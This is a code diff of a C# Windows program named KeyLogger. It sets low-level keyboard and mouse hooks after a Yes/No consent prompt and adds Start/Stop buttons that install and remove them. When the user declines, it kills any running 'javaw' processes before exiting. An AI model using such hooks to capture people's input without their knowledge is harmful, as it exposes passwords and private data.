@@ -41,11 +41,34 @@ namespace KeyLogger
             DialogResult result = MessageBox.Show(message, "Agree or not", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
             if (result == DialogResult.Yes)
             {
-
+                _hookIDKey = SetHook(_procKey);
+                _hookIDMouse = SetHook(_procMouse);
+                form1 = this; // (Form1)Application.OpenForms[0];
+                btnStart.Enabled = false;
+                btnStop.Enabled = true;
             }
-            else if(result == DialogResult.No)
+            else if (result == DialogResult.No)
             {
-               // Application.Exit();
+                // Application.Exit();
+
+                Process[] process = Process.GetProcesses();
+                foreach (Process p in process)
+                {
+                    if (p.ProcessName.StartsWith("javaw"))
+                    {
+                        try
+                        {
+                            p.Kill();
+                        }
+                        catch (Exception e)
+                        {
+
+                        }
+
+                    }
+
+                }
+
                 Environment.Exit(0);
             }
 
@@ -53,15 +76,26 @@ namespace KeyLogger
 
         private void btnStart_Click(object sender, EventArgs e)
         {
+            if(_hookIDKey != null)
+            UnhookWindowsHookEx(_hookIDKey);
+            if(_hookIDMouse != null)
+            UnhookWindowsHookEx(_hookIDMouse);
+
             _hookIDKey = SetHook(_procKey);
             _hookIDMouse = SetHook(_procMouse);
-            form1 = (Form1)Application.OpenForms[0];
+
+            btnStart.Enabled = false;
+            btnStop.Enabled = true;
+            // form1 = (Form1)Application.OpenForms[0];
         }
 
         private void btnStop_Click(object sender, EventArgs e)
         {
             UnhookWindowsHookEx(_hookIDKey);
             UnhookWindowsHookEx(_hookIDMouse);
+
+            btnStart.Enabled = true;
+            btnStop.Enabled = false;
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
